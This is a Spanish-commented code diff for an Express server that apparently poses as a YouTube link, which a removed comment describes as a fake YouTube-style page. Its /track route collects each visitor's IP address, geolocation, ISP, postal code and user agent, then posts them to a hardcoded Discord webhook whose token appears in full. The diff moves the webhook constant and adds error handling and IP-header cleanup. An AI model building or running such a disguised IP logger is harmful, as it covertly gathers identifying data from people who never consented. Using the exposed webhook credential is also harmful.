@@ -1,14 +1,16 @@
 const express = require("express");
-const fetch = require("node-fetch");
 const path = require("path");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// URL del video real
 const REAL_YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI"; // Pega el tuyo
 
-// Servir HTML falso estilo YouTube
+// Webhook de Discord (¡no lo dejes expuesto si es real!)
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI";
+
+// Servir archivos estáticos desde la carpeta "public"
 app.use(express.static(path.join(__dirname, "public")));
 
 async function getIPInfo(ip) {
@@ -28,7 +30,7 @@ async function sendToDiscord(info, userAgent, timestamp) {
 🕒 Hora (UTC): ${timestamp}
 🌐 IP: \`${info.ip || "Desconocida"}\`
 🏙️ Ciudad: ${info.city || "Desconocida"}, ${info.region || "Desconocida"}
-🌍 País: ${info.country_name || "Desconocido"}
+🌍 País: ${info.country || "Desconocido"}
 🏢 ISP: ${info.org || "Desconocido"}
 📦 ASN: ${info.asn || "Desconocido"}
 📫 Código Postal: ${info.postal || "Desconocido"}
@@ -37,15 +39,19 @@ async function sendToDiscord(info, userAgent, timestamp) {
 \`\`\`${userAgent || "No disponible"}\`\`\``
   };
 
-  await fetch(DISCORD_WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(message)
-  });
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(message)
+    });
+  } catch (err) {
+    console.error("Error al enviar al webhook:", err);
+  }
 }
 
 app.get("/track", async (req, res) => {
-  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
   const userAgent = req.headers["user-agent"];
   const timestamp = new Date().toISOString();
 
@@ -58,5 +64,5 @@ app.get("/track", async (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`Servidor activo en el puerto ${PORT}`);
+  console.log(`✅ Servidor activo en http://localhost:${PORT}`);
 });
